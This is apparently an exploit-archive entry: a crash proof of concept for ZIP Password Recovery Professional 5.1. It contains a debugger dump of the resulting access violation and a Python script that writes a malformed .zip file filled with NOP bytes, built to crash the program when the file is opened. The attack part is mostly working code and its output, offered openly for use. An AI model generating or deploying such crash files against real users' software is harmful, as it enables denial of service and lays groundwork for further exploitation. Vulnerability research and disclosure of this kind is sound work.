# Exploit Title:  ZIP Password Recovery Professional 5.1 (.zip) - Crash POC
# Date: 30.11.2013
# Exploit Author: KAI - (KAISAI12)
# Version: 5.1
# Vendor Homepage: http://www.recoverlostpassword.com/
# Tested on: [ Windows 7]
#============================================================================================
# After creating POC file (.zip), Add File To Program
#============================================================================================
# Contact :
#------------------
# Web Page : http://www.ceh.vn
#============================================================================================
 
#This exception may be expected and handled.
#eax=ffffff9a ebx=00000001 ecx=00000000 edx=00000000 esi=014b4f90 edi=001ec7d4
#eip=1000455c esp=001ec138 ebp=001ec2c8 iopl=0         nv up ei ng nz na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ZIP Password Recovery Professional\ZipPasswordCrack.dll - 
#ZipPasswordCrack!CZipPasswordCrack::operator=+0x2f9c:
#1000455c 837a5000        cmp     dword ptr [edx+50h],0 ds:0023:00000050=????????

#!/usr/bin/python
head = "x68\x74\x74\x70\x3a\x2f\x2f"
buf = "\x90"*2000
try:
    fo=open("zipcrack.zip","w");
    fo.write(head+buf);
    fo.close();
    print "create succsess file"
except:
    print "create error !"
